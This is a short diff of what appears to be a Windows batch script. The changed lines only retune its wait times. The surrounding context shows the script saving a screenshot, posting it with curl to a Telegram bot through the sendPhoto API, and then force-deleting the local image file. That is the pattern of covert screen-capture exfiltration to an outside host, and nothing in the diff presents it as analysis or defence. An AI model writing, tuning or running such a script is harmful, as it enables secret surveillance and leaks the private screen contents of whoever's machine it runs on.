@@ -70,7 +70,7 @@ set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
-timeout /t 600 /nobreak
+timeout /t 180 /nobreak
 
 
 
@@ -95,7 +95,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 
 
-timeout /t 600 /nobreak
+timeout /t 1020 /nobreak
 
 
 
